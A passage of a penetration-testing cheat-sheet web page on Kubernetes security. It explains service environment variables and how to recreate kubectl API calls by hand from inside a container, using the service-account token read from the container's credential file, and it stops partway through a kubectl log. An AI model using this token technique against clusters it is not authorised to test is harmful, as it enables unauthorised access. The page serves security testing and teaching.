<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="All about kubernetes security"><meta name=theme-color content="#FFFFFF"><meta name=color-scheme content="light dark"><meta property="og:title" content="Kuburnetes"><meta property="og:description" content="All about kubernetes security"><meta property="og:type" content="article"><meta property="og:url" content="https://www.grayhatfreelancing.com/docs/kuburnetes/"><meta property="article:section" content="docs"><meta property="article:published_time" content="2023-03-29T00:00:00+00:00"><meta property="article:modified_time" content="2023-03-28T03:15:07-04:00"><title>Kuburnetes | Gray Hat Freelancing</title><link rel=manifest href=/manifest.json><link rel=icon href=/favicon.png type=image/x-icon><link rel=stylesheet href=/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css integrity="sha256-SzX+0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt+5t7EDugY=" crossorigin=anonymous><script defer src=/flexsearch.min.js></script>
<script defer src=/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2+lMiccGbo=" crossorigin=anonymous></script>
<script defer src=/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js integrity="sha256-b2+Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC+NdcPIvZhzk=" crossorigin=anonymous></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-5VH24CV5RY"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-5VH24CV5RY",{anonymize_ip:!1})}</script><script type=text/javascript>(function(e,t,n,s,o,i,a){e[o]=e[o]||function(){(e[o].a=e[o].a||[]).push(arguments)},e[o].l=1*new Date;for(var r=0;r<document.scripts.length;r++)if(document.scripts[r].src===s)return;i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)})(window,document,"script","https://mc.yandex.ru/metrika/tag.js","ym"),ym(90832071,"init",{clickmap:!0,trackLinks:!0,accurateTrackBounce:!0,webvisor:!0})</script><noscript><div><img src=https://mc.yandex.ru/watch/90832071 style=position:absolute;left:-9999px alt></div></noscript><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4012275371022894" crossorigin=anonymous></script>
<script async src="https://fundingchoicesmessages.google.com/i/pub-4012275371022894?ers=1" nonce=JP_uCP3IebkCUXDh6KjRmw></script><script nonce=JP_uCP3IebkCUXDh6KjRmw>(function(){function e(){if(!window.frames.googlefcPresent)if(document.body){const e=document.createElement("iframe");e.style="width: 0; height: 0; border: none; z-index: -1000; left: -1000px; top: -1000px;",e.style.display="none",e.name="googlefcPresent",document.body.appendChild(e)}else setTimeout(e,0)}e()})()</script>
<script>(function(){"use strict";if(V=function(e){var t=0;return function(){return t<e.length?{done:!1,value:e[t++]}:{done:!0}}},P="function"==typeof Object.create?Object.create:function(e){var t=function(){};return t.prototype=e,new t},"function"==typeof Object.setPrototypeOf)g=Object.setPrototypeOf;else{a:{N={a:!0},O={};try{O.__proto__=N,k=O.a;break a}catch{}k=!1}g=k?function(e,t){if(e.__proto__=t,e.__proto__!==t)throw new TypeError(e+" is not extensible");return e}:null}var F=g,w=function(e,t){if(e.prototype=P(t.prototype),e.prototype.constructor=e,F)F(e,t);else for(n in t)if("prototype"!=n)if(Object.defineProperties){var n,s=Object.getOwnPropertyDescriptor(t,n);s&&Object.defineProperty(e,n,s)}else e[n]=t[n];e.v=t.prototype},e=this||self,Z=function(){},M=function(e){return e},m=function(e,t){this.g=t===S?e:""};m.prototype.toString=function(){return this.g+""},S={},E=function(t){if(void 0===h){var n=null,s=e.trustedTypes;if(s&&s.createPolicy){try{n=s.createPolicy("goog#html",{createHTML:M,createScript:M,createScriptURL:M})}catch(t){e.console&&e.console.error(t.message)}h=n}else h=n}return t=(n=h)?n.createScriptURL(t):t,new m(t,S)},x=function(){return Math.floor(2147483648*Math.random()).toString(36)+Math.abs(Math.floor(2147483648*Math.random())^Date.now()).toString(36)},C={},r=null,b="function"==typeof Uint8Array;function T(e,t,n){return"object"==typeof e?b&&!Array.isArray(e)&&e instanceof Uint8Array?n(e):D(e,t,n):t(e)}function D(e,t,n){if(Array.isArray(e)){for(var a,o=Array(e.length),s=0;s<e.length;s++)a=e[s],a!=null&&(o[s]=T(a,t,n));return Array.isArray(e)&&e.s&&i(o),o}o={};for(s in e)Object.prototype.hasOwnProperty.call(e,s)&&(a=e[s],a!=null&&(o[s]=T(a,t,n)));return o}function ee(e){return D(e,function(e){return"number"==typeof e?isFinite(e)?e:String(e):e},function(e){if(void 0===n&&(n=0),!r){r={};for(var t,n,s,o,l,d,a="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split(""),c=["+/=","+/","-_=","-_.","-_"],i=0;5>i;i++){t=a.concat(c[i].split("")),C[i]=t;for(s=0;s<t.length;s++)o=t[s],void 0===r[o]&&(r[o]=s)}}n=C[n],a=Array(Math.floor(e.length/3)),c=n[64]||"";for(i=t=0;t<e.length-2;t+=3)l=e[t],d=e[t+1],o=e[t+2],s=n[l>>2],l=n[(l&3)<<4|d>>4],d=n[(d&15)<<2|o>>6],o=n[o&63],a[i++]=""+s+l+d+o;switch(s=0,o=c,e.length-t){case 2:s=e[t+1],o=n[(s&15)<<2]||c;case 1:e=e[t],a[i]=""+n[e>>2]+n[(e&3)<<4|s>>4]+o+c}return a.join("")})}var $={s:{value:!0,configurable:!0}},i=function(e){return Array.isArray(e)&&!Object.isFrozen(e)&&Object.defineProperties(e,$),e},o=function(e,t,n){var s=p;p=null,e||(e=s),s=this.constructor.u,e||(e=s?[s]:[]),this.j=s?0:-1,this.h=null,this.g=e;a:{if(s=this.g.length,e=s-1,s&&(s=this.g[e],!(null===s||"object"!=typeof s||Array.isArray(s)||b&&s instanceof Uint8Array))){this.l=e-this.j,this.i=s;break a}void 0!==t&&-1<t?(this.l=Math.max(t,e+1-this.j),this.i=null):this.l=Number.MAX_VALUE}if(n)for(t=0;t<n.length;t++)e=n[t],e<this.l?(e+=this.j,(s=this.g[e])?i(s):this.g[e]=f):(s=this.l+this.j,this.g[s]||(this.i=this.g[s]={}),(s=this.i[e])?i(s):this.i[e]=f)},f=Object.freeze(i([])),t=function(e,t){if(-1===t)return null;if(t<e.l){t+=e.j;var n=e.g[t];return n!==f?n:e.g[t]=i([])}if(e.i)return n=e.i[t],n!==f?n:e.i[t]=i([])},z=function(e,n){var s,o=L;return-1===n?null:(e.h||(e.h={}),e.h[n]||(s=t(e,n),s&&(e.h[n]=new o(s))),e.h[n])};o.prototype.toJSON=function(){var e=l(this,!1);return ee(e)},l=function(e,t){if(e.h)for(o in e.h)if(Object.prototype.hasOwnProperty.call(e.h,o)){var s,o,n=e.h[o];if(Array.isArray(n))for(s=0;s<n.length;s++)n[s]&&l(n[s],t);else n&&l(n,t)}return e.g},j=function(e,t){return p=t=t?JSON.parse(t):null,e=new e(t),p=null,e},o.prototype.toString=function(){return l(this,!1).toString()},A=function(e){o.call(this,e)},w(A,o);function Q(e){var t,s=(e.ownerDocument&&e.ownerDocument.defaultView||window).document,n=null===(t=s.querySelector)||void 0===t?void 0:t.call(s,"script[nonce]");(t=n?n.nonce||n.getAttribute("nonce")||"":"")&&e.setAttribute("nonce",t)}u=function(e,t){return t=String(t),"application/xhtml+xml"===e.contentType&&(t=t.toLowerCase()),e.createElement(t)},d=function(t){this.g=t||e.document||document},d.prototype.appendChild=function(e,t){e.appendChild(t)};var r,l,d,u,h,p,g,b,j,y,_,O,x,C,E,k,A,S,N,P,V,v=function(e,t,n,s,o,i){try{var r=e.g,a=u(e.g,"SCRIPT");a.async=!0,a.src=t instanceof m&&t.constructor===m?t.g:"type_error:TrustedResourceUrl",Q(a),r.head.appendChild(a),a.addEventListener("load",function(){o(),s&&r.head.removeChild(a)}),a.addEventListener("error",function(){0<n?v(e,t,n-1,s,o,i):(s&&r.head.removeChild(a),i())})}catch{i()}},X=e.atob("aHR0cHM6Ly93d3cuZ3N0YXRpYy5jb20vaW1hZ2VzL2ljb25zL21hdGVyaWFsL3N5c3RlbS8xeC93YXJuaW5nX2FtYmVyXzI0ZHAucG5n"),K=e.atob("WW91IGFyZSBzZWVpbmcgdGhpcyBtZXNzYWdlIGJlY2F1c2UgYWQgb3Igc2NyaXB0IGJsb2NraW5nIHNvZnR3YXJlIGlzIGludGVyZmVyaW5nIHdpdGggdGhpcyBwYWdlLg=="),U=e.atob("RGlzYWJsZSBhbnkgYWQgb3Igc2NyaXB0IGJsb2NraW5nIHNvZnR3YXJlLCB0aGVuIHJlbG9hZCB0aGlzIHBhZ2Uu"),W=function(e,t,n){this.h=e,this.j=new d(this.h),this.g=null,this.i=[],this.l=!1,this.o=t,this.m=n},I=function(t){if(t.h.body&&!t.l){var n=function(){B(t),e.setTimeout(function(){return R(t,3)},50)};v(t.j,t.o,2,!0,function(){e[t.m]||n()},n),t.l=!0}},B=function(e){for(var i,r,c,l,t=n(1,5),o=0;o<t;o++)i=s(e),e.h.body.appendChild(i),e.i.push(i);t=s(e),t.style.bottom="0",t.style.left="0",t.style.position="fixed",t.style.width=n(100,110).toString()+"%",t.style.zIndex=n(2147483544,2147483644).toString(),t.style["background-color"]=H(249,259,242,252,219,229),t.style["box-shadow"]="0 0 12px #888",t.style.color=H(0,10,0,10,0,10),t.style.display="flex",t.style["justify-content"]="center",t.style["font-family"]="Roboto, Arial",o=s(e),o.style.width=n(80,85).toString()+"%",o.style.maxWidth=n(750,775).toString()+"px",o.style.margin="24px",o.style.display="flex",o.style["align-items"]="flex-start",o.style["justify-content"]="center",i=u(e.j.g,"IMG"),i.className=x(),i.src=X,i.style.height="24px",i.style.width="24px",i.style["padding-right"]="16px",r=s(e),c=s(e),c.style["font-weight"]="bold",c.textContent=K,l=s(e),l.textContent=U,a(e,r,c),a(e,r,l),a(e,o,i),a(e,o,r),a(e,t,o),e.g=t,e.h.body.appendChild(e.g),t=n(1,5);for(o=0;o<t;o++)i=s(e),e.h.body.appendChild(i),e.i.push(i)},a=function(e,t,o){for(var r,i=n(1,5),a=0;a<i;a++)r=s(e),t.appendChild(r);t.appendChild(o),o=n(1,5);for(i=0;i<o;i++)a=s(e),t.appendChild(a)},n=function(e,t){return Math.floor(e+Math.random()*(t-e))},H=function(e,t,s,o,i,a){return"rgb("+n(Math.max(e,0),Math.min(t,255)).toString()+","+n(Math.max(s,0),Math.min(o,255)).toString()+","+n(Math.max(i,0),Math.min(a,255)).toString()+")"},s=function(e){return e=u(e.j.g,"DIV"),e.className=x(),e},R=function(t,n){0>=n||null!=t.g&&0!=t.g.offsetHeight&&0!=t.g.offsetWidth||(q(t),B(t),e.setTimeout(function(){return R(t,n-1)},50))},q=function(e){var t=e.i,n="undefined"!=typeof Symbol&&Symbol.iterator&&t[Symbol.iterator],t=n?n.call(t):{next:V(t)};for(n=t.next();!n.done;n=t.next())(n=n.value)&&n.parentNode&&n.parentNode.removeChild(n);e.i=[],(t=e.g)&&t.parentNode&&t.parentNode.removeChild(t),e.g=null},Y=function(t,n,s,o,i){var a=G(s),c=function(s){s.appendChild(a),e.setTimeout(function(){a?(0!==a.offsetHeight&&0!==a.offsetWidth?n():t(),a.parentNode&&a.parentNode.removeChild(a)):t()},o)},r=function(t){document.body?c(document.body):0<t?e.setTimeout(function(){r(t-1)},i):n()};r(3)},G=function(e){var t=document.createElement("div");return t.className=e,t.style.width="1px",t.style.height="1px",t.style.position="absolute",t.style.left="-10000px",t.style.top="-10000px",t.style.zIndex="-10000",t},L=function(e){o.call(this,e)};w(L,o),_=function(e){o.call(this,e)},w(_,o),y=function(e,n){this.l=e,this.m=new d(e.document),this.g=n,this.i=t(this.g,1),n=z(this.g,2),this.o=E(t(n,4)||""),this.h=!1,n=z(this.g,13),n=E(t(n,4)||""),this.j=new W(e.document,n,t(this.g,12))},y.prototype.start=function(){J(this)};var J=function(n){te(n),v(n.m,n.o,3,!1,function(){a:{var i,s=n.i,o=e.btoa(s);if(o=e[o]){try{i=j(A,e.atob(o))}catch{s=!1;break a}s=s===t(i,1)}else s=!1}s?c(n,t(n.g,14)):(c(n,t(n.g,8)),I(n.j))},function(){Y(function(){c(n,t(n.g,7)),I(n.j)},function(){return c(n,t(n.g,6))},t(n.g,9),t(n.g,10),t(n.g,11))})},c=function(e,t){e.h||(e.h=!0,e=new e.l.XMLHttpRequest,e.open("GET",t,!0),e.send())},te=function(n){var s=e.btoa(n.i);n.l[s]&&c(n,t(n.g,5))};(function(t,n){e[t]=function(){for(var i=[],o=0;o<arguments.length;++o)i[o-0]=arguments[o];e[t]=Z,n.apply(null,i)}})("__h82AlnkH6D91__",function(e){"function"==typeof window.atob&&new y(window,j(_,window.atob(e))).start()})}).call(this),window.__h82AlnkH6D91__("WyJwdWItNDAxMjI3NTM3MTAyMjg5NCIsW251bGwsbnVsbCxudWxsLCJodHRwczovL2Z1bmRpbmdjaG9pY2VzbWVzc2FnZXMuZ29vZ2xlLmNvbS9iL3B1Yi00MDEyMjc1MzcxMDIyODk0Il0sbnVsbCxudWxsLCJodHRwczovL2Z1bmRpbmdjaG9pY2VzbWVzc2FnZXMuZ29vZ2xlLmNvbS9lbC9BR1NLV3hWWTQzNTA3UlV4MlBicWdSRGsxQnFnWnV6Rm5xU3hmTDZsRVcyVDRvSVhTa2QzRlZvQlpra0RHTlRvYmU1dTM5U3k4bFVROGJsNVpxQjlxWGh6Z3FuT1JBXHUwMDNkXHUwMDNkP3RlXHUwMDNkVE9LRU5fRVhQT1NFRCIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFY1V0czR01DdDNLNmVxTDlKQ2NFNnJwU0oxNDVZTjlXOS1SU2tFd3J3NXhMbEROSU1rdVVCcnI2QjJyY3Zia0w0dGNMOEFCV0ZFUy1idzBNWG8zcUdyTUFcdTAwM2RcdTAwM2Q/YWJcdTAwM2QxXHUwMDI2c2JmXHUwMDNkMSIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFhfdzJlbk9UVmhhN05TeVAxakR2SkJyMU1MbDhvS0Zpb0N1bm0wVWxFMEdqUGVtVUM1RFpLajFTWGxBYktHUWZWa1lvNWs0RlIzbXdvdktROVA2cWE4cmdcdTAwM2RcdTAwM2Q/YWJcdTAwM2QyXHUwMDI2c2JmXHUwMDNkMSIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFdNTi1PNHpRLUJENU1wakZVNWVjUVdqeGIwNHh5Yzc3akdlOEdwbjZ5VWtiemF3SkxYV3lfQ2xMWWFORVEtWER0cXJ4R1JQMzBpbjNBUnJZTXR2NHlXMWdcdTAwM2RcdTAwM2Q/c2JmXHUwMDNkMiIsImRpdi1ncHQtYWQiLDIwLDEwMCwiY0hWaUxUUXdNVEl5TnpVek56RXdNakk0T1RRXHUwMDNkIixbbnVsbCxudWxsLG51bGwsImh0dHBzOi8vd3d3LmdzdGF0aWMuY29tLzBlbW4vZi9wL3B1Yi00MDEyMjc1MzcxMDIyODk0LmpzP3VzcXBcdTAwM2RDQVEiXSwiaHR0cHM6Ly9mdW5kaW5nY2hvaWNlc21lc3NhZ2VzLmdvb2dsZS5jb20vZWwvQUdTS1d4VnlVcTVpZThXX0JkWFlGNXo3MzhtQjBkMEcxeEFlZ1BPZHp3WGVDdFdvQW5xVVNvWndVdW00UFhMRXNpUEZ1b2oxUUFUN25WNl9XWDdjMEE1X3VacFd2UVx1MDAzZFx1MDAzZCJd")</script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><img src=/logo.png alt=Logo><span>Gray Hat Freelancing</span></a></h2><div class=book-search><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><ul><li><a href=/docs/csv_injection/>Csv Injection</a></li><li><a href=/docs/checking_for_account_takeover/>Account Takeovers</a></li><li><a href=/docs/cobalt_strike_all_you_need/>Cobalt Strike</a></li><li><a href=/docs/docker_pentesting/>Docker Security</a></li><li><a href=/docs/insecure_direct_object_references/>Insecure Direct Object References</a></li><li><a href=/docs/kuburnetes/ class=active>Kuburnetes</a></li><li><a href=/docs/attacking_active_directory/>Active Directory Attacks</a></li><li><a href=/docs/amazon_aws_s3_buckets/>Amazon AWS S3 Buckets</a></li><li><a href=/docs/api_key_leaks/>API Key Leaks</a></li><li><a href=/docs/argument_injection/>Argument Injection</a></li><li><a href=/docs/command_injection/>Command Injection</a></li><li><a href=/docs/cors_misconfigurations/>CORS Misconfigurations</a></li><li><a href=/docs/csrf_injection/>CSRF Injection</a></li><li><a href=/docs/directory_traversal/>Directory Traversal</a></li><li><a href=/docs/network_discovery/>Network Discovery</a></li><li><a href=/docs/insecure_deserialization/python/>Python Deserialization</a></li><li><a href=/docs/insecure_deserialization/ruby/>Ruby Deserialization</a></li><li><a href=/docs/web_sockets/>Web Sockets Attacks</a></li><li><a href=/docs/insecure_deserialization/yaml/>YAML Deserialization</a></li><li><a href=/docs/insecure_deserialization/dotnet/>.NET Insecure Deserialization</a></li><li><a href=/docs/exercism_solutions/>Exercism Solutions</a></li><li><a href=/docs/insecure_deserialization/>Insecure Deserialization</a></li><li><a href=/docs/insecure_deserialization/node/>Node Insecure Deserialization</a></li><li><a href=/docs/insecure_deserialization/php/>PHP Insecure Deserialization</a></li><li><a href=/docs/crlf_injection/>CRLF Injection</a></li><li><a href=/docs/insecure_deserialization/java/>Insecure Deserialization - Java</a></li><li><a href=/docs/brute_force_cracking/>Brute Force Cracking</a></li><li><a href=/docs/training_grounds/>Training Grounds</a></li><li><a href=/docs/wordpress/>Wordpress Security</a></li><li><a href=/docs/windows_hardening/>Windows - Hardening</a></li><li><a href=/docs/windows_amsi_bypass/>Bypassing AMSI protections</a></li><li><a href=/docs/subdomains_enumeration/>Enumerating Subdomains</a></li><li><a href=/docs/windows_mimikatz/>Windows - Mimikatz</a></li><li><a href=/docs/windows_persistence/>Windows - Persistence</a></li><li><a href=/docs/windows_privilege_escalation/>Windows - Privilege Escalation</a></li><li><a href=/docs/windows_using_credentials/>Windows - Using Credentials</a></li><li><a href=/docs/windows_download_and_execute/>Windows Download and Execute Methods</a></li><li><a href=/docs/escape_breakout/>Application Escape and Breakout</a></li><li><a href=/docs/office_attacks/>Attacking Office</a></li><li><a href=/docs/bind_shell_cheatsheet/>Bind Shell Cheatsheet</a></li><li><a href=/docs/methodology_and_enumeration/>Bug Hunting Methodology and Enumeration</a></li><li><a href=/docs/hash_cracking/>Hash Cracking Cheatsheet</a></li><li><a href=/docs/linux_persistence/>Linux - Persistence</a></li><li><a href=/docs/linux_privilege_escalation/>Linux - Privilege Escalation</a></li><li><a href=/docs/metasploit_cheatsheet/>Metasploit</a></li><li><a href=/docs/windows_dpapi/>Microsoft Window's Data Protection API</a></li><li><a href=/docs/microsoft_azure_cloud/>Microsoft's Azure Cloud</a></li><li><a href=/docs/network_pivoting_techniques/>Network Pivoting Cheatsheet</a></li><li><a href=/docs/mssql_server_cheatsheet/>Pentesting MSSQL Server Cheatsheet</a></li><li><a href=/docs/powershell_cheatsheet/>Powershell Cheatsheet</a></li><li><a href=/docs/reverse_shell_cheatsheet/>Reverse Shell Cheatsheet</a></li><li><a href=/docs/source_code_management/>Source Code Management</a></li><li><a href=/docs/miscellaneous_tricks/>Miscellaneous Tips and Tricks</a></li><li><a href=/docs/cve_exploits/>CVE Exploits</a></li><li><a href=/docs/dependency_confusion_attacks/>Dependency Confusion</a></li><li><a href=/docs/dns_rebinding/>DNS Rebinding</a></li><li><a href=/docs/file_inclusion/>File Inclusion</a></li><li><a href=/docs/http_parameter_pollution/>HTTP Parameter Pollution</a></li><li><a href=/docs/insecure_file_uploads/>Insecure File Upload</a></li><li><a href=/docs/insecure_management_interfaces/>Insecure Management Interface</a></li><li><a href=/docs/insecure_source_code_management/>Insecure Source Code Management</a></li><li><a href=/docs/java_rmi/>Java RMI</a></li><li><a href=/docs/json_web_token/>JSON Web Tokens</a></li><li><a href=/docs/latex_injection/>LaTeX Injection</a></li><li><a href=/docs/ldap_injection/>LDAP Injection</a></li><li><a href=/docs/nosql_injection/>NoSQL Injection</a></li><li><a href=/docs/oauth/>OAuth</a></li><li><a href=/docs/open_url_redirection/>Open URL Redirection</a></li><li><a href=/docs/race_conditions/>Race Conditions</a></li><li><a href=/docs/request_smuggling/>Request Smuggling</a></li><li><a href=/docs/saml_injection/>SAML Injection</a></li><li><a href=/docs/server_side_request_forgery/>Server-Side Request Forgery</a></li><li><a href=/docs/server_side_template_injection/>Server-Side Template Injection</a></li><li><a href=/docs/sql_injection/>SQL Injection</a></li><li><a href=/docs/tabnabbing/>Tabnabbing</a></li><li><a href=/docs/type_juggling/>Type Juggling</a></li><li><a href=/docs/web_cache_deception/>Web Cache Deception</a></li><li><a href=/docs/xxe_injection/>XML eXternal Entity Injection</a></li><li><a href=/docs/xpath_injection/>XPATH Injection</a></li><li><a href=/docs/xslt_injection/>XSLT Injection</a></li><li><a href=/docs/xss_injection/>XSS Injection</a></li><li><a href=/docs/graphql_injection/>GraphQL Injection</a></li></ul><ul><li><a href=/posts/>Blog</a></li><li><a href=https://github.com/m00tiny/ target=_blank rel=noopener>Github</a></li><li><a href=https://github.com/m00tiny/grayhatfreelancing target=_blank rel=noopener>Contribute</a></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label>
<strong>Kuburnetes</strong>
<label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><ul><li><ul><li><a href=#simulating-kubectl-api-requests>Simulating <code>kubectl</code> API Requests</a></li></ul></li><li><a href=#information-gathering>Information Gathering</a><ul><li><a href=#service-account-permissions>Service Account Permissions</a></li><li><a href=#secrets-configmaps-and-volumes>Secrets, ConfigMaps, and Volumes</a></li><li><a href=#privileged-containers>Privileged Containers</a></li></ul></li><li><a href=#rbac-configuration>RBAC Configuration</a><ul><li><a href=#listing-secrets>Listing Secrets</a></li><li><a href=#access-any-resource-or-verb>Access Any Resource or Verb</a></li><li><a href=#pod-creation>Pod Creation</a></li><li><a href=#privilege-to-use-podsexec>Privilege to Use Pods/Exec</a></li><li><a href=#privilege-to-getpatch-rolebindings>Privilege to Get/Patch Rolebindings</a></li><li><a href=#impersonating-a-privileged-account>Impersonating a Privileged Account</a></li></ul></li><li><a href=#privileged-service-account-token>Privileged Service Account Token</a></li><li><a href=#interesting-endpoints-to-reach>Interesting endpoints to reach</a></li><li><a href=#api-addresses-that-you-should-know>API addresses that you should know</a><ul><li><a href=#cadvisor>cAdvisor</a></li><li><a href=#insecure-api-server>Insecure API server</a></li><li><a href=#secure-api-server>Secure API Server</a></li><li><a href=#etcd-api>etcd API</a></li><li><a href=#kubelet-api>Kubelet API</a></li><li><a href=#kubelet-read-only>kubelet (Read only)</a></li></ul></li><li><a href=#references>References</a></li></ul></li></ul></nav></aside></header><article class=markdown><ul><li>A <a href=https://docs.docker.com/network/links/#environment-variables>Docker links</a> collection of variables named <code>{SVCNAME}_PORT_{NUM}_{PROTOCOL}_{PROTO|PORT|ADDR}</code> for each port the service exposes.</li></ul><p>For example, all of the following environment variables would be available if a <code>redis-master</code> service were running with port 6379 exposed:</p><pre tabindex=0><code>REDIS_MASTER_SERVICE_HOST=10.0.0.11
REDIS_MASTER_SERVICE_PORT=6379
REDIS_MASTER_PORT=tcp://10.0.0.11:6379
REDIS_MASTER_PORT_6379_TCP=tcp://10.0.0.11:6379
REDIS_MASTER_PORT_6379_TCP_PROTO=tcp
REDIS_MASTER_PORT_6379_TCP_PORT=6379
REDIS_MASTER_PORT_6379_TCP_ADDR=10.0.0.11
</code></pre><h3 id=simulating-kubectl-api-requests>Simulating <code>kubectl</code> API Requests
<a class=anchor href=#simulating-kubectl-api-requests>#</a></h3><p>Most containers within a Kubernetes cluster won&rsquo;t have the <code>kubectl</code> utility installed. If running the <a href=https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux>one-line <code>kubectl</code> installer</a> within the container isn&rsquo;t an option, you may need to craft Kubernetes HTTP API requests manually. This can be done by using <code>kubectl</code> <em>locally</em> to determine the correct API request to send from the container.</p><ol><li>Run the desired command at the maximum verbosity level using <code>kubectl -v9 ...</code></li><li>The output will include HTTP API endpoint URL, the request body, and an example curl command.</li><li>Replace the endpoint URL&rsquo;s hostname and port with the <code>KUBERNETES_SERVICE_HOST</code> and <code>KUBERNETES_SERVICE_PORT</code> values from the container&rsquo;s environment variables.</li><li>Replace the masked &ldquo;Authorization: Bearer&rdquo; token value with the contents of <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code> from the container.</li><li>If the request had a body, ensure the &ldquo;Content-Type: application/json&rdquo; header is included and send the request body using the customary method (for curl, use the <code>--data</code> flag).</li></ol><p>For example, this output was used to create the <a href=#service-account-permissions>Service Account Permissions</a> request:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e># NOTE: only the Authorization and Content-Type headers are required. The rest can be omitted.</span>
</span></span><span style=display:flex><span>$ kubectl -v9 auth can-i --list
</span></span><span style=display:flex><span>I1028 <span style=color:#ae81ff>18</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>58</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>38.192352</span>   <span style=color:#ae81ff>76118</span> loader.go<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>359</span>] Config loaded from file /home/example/.kube/config
</span></span><span style=display:flex><span>I1028 <span style=color:#ae81ff>18</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>58</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>38.193847</span>   <span style=color:#ae81ff>76118</span> request.go<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>942</span>] Request Body<span style=color:#960050;background-color:#1e0010>:</span> {<span style=color:#e6db74>&#34;kind&#34;</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#e6db74>&#34;SelfSubjectRulesReview&#34;</span>,<span style=color:#e6db74>&#34;apiVersion&#34;</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#e6db74>&#34;authorization.k8s.io/v1&#34;</span>,<span style=color:#e6db74>&#34;metadata&#34;</span><span style=color:#960050;background-color:#1e0010>:</span>{<span style=color:#e6db74>&#34;creationTimestamp&#34;</span><span style=color:#960050;background-color:#1e0010>:</span>null},<span style=color:#e6db74>&#34;spec&#34;</span><span style=color:#960050;background-color:#1e0010>:</span>{<span style=color:#e6db74>&#34;namespace&#34;</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#e6db74>&#34;default&#34;</span>},<span style=color:#e6db74>&#34;status&#34;</span><span style=color:#960050;background-color:#1e0010>:</span>{<span style=color:#e6db74>&#34;resourceRules&#34;</span><span style=color:#960050;background-color:#1e0010>:</span>null,<span style=color:#e6db74>&#34;nonResourceRules&#34;</span><span style=color:#960050;background-color:#1e0010>:</span>null,<span style=color:#e6db74>&#34;incomplete&#34;</span><span style=color:#960050;background-color:#1e0010>:</span>false}}
</span></span><span style=display:flex><span>I1028 <span style=color:#ae81ff>18</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>58</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>38.193912</span>   <span style=color:#ae81ff>76118</span> round_trippers.go<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>419</span>] curl -k -v -XPOST  -H <span style=color:#e6db74>&#34;Accept: application/json, */*&#34;</span> -H <span style=color:#e6db74>&#34;Content-Type: application/json&#34;</span> -H <span style=color:#e6db74>&#34;User-Agent: kubectl/v1.14.10 (linux/amd64) kubernetes/f5757a1&#34;</span> <span style=color:#e6db74>&#39;https://1.2.3.4:5678/apis/authorization.k8s.io/v1/selfsubjectrulesreviews&#39;</span>
</span></span><span style=display:flex><span>I1028 <span style=color:#ae81ff>18</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>58</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>38.295722</span>   <span style=color:#ae81ff>76118</span> round_trippers.go<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>438</span>] POST https<span style=color:#960050;background-color:#1e0010>:</span>//<span style=color:#ae81ff>1.2</span>.3.<span style=color:#ae81ff>4</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>5678</span>/apis/authorization.k8s.io/v1/selfsubjectrulesreviews <span style=color:#ae81ff>201</span> Created <span style=color:#66d9ef>in</span> <span style=color:#ae81ff>101</span> milliseconds
